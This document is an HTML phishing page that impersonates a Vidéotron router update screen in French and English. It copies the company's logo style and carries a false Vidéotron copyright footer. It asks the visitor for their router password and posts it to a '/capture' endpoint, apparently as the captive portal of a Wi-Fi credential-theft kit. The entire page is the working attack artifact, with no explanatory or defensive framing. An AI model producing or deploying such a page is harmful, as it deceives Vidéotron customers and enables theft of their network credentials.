<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mise à jour Vidéotron / Videotron Update</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 450px;
            text-align: center;
        }
        .logo {
            width: 150px;
            margin-bottom: 25px;
        }
        h1 {
            font-size: 26px;
            color: #333;
            margin-bottom: 15px;
        }
        p {
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
        }
        input[type="submit"] {
            background-color: #ffc107; /* Jaune Vidéotron */
            color: #000; /* Lettres noires */
            padding: 12px;
            border: none;
            border-radius: 4px;
            width: 100%;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #e0a800; /* Jaune plus foncé au survol */
        }
        .footer {
            font-size: 12px;
            color: #999;
            margin-top: 25px;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="logo" viewBox="0 0 150 50" xmlns="http://www.w3.org/2000/svg">
            <rect width="150" height="50" fill="#ffc107" rx="5" ry="5" />
            <text x="50%" y="35" font-size="25" font-family="Arial" font-weight="bold" fill="#000" text-anchor="middle">Vidéotron</text>
        </svg>
        <h1>Mise à jour de votre router / Router Update</h1>
        <p>Veuillez entrer le mot de passe de votre router Vidéotron pour procéder à la mise à jour.<br>Please enter your router password to proceed with the Videotron update.</p>
        <form action="/capture" method="POST">
            <input type="password" name="password" placeholder="Mot de passe de votre router / Router Password" required>
            <input type="submit" value="Connexion / Login">
        </form>
        <div class="footer">
            © 2025 Vidéotron. Tous droits réservés. / All rights reserved.
        </div>
    </div>
</body>
</html>
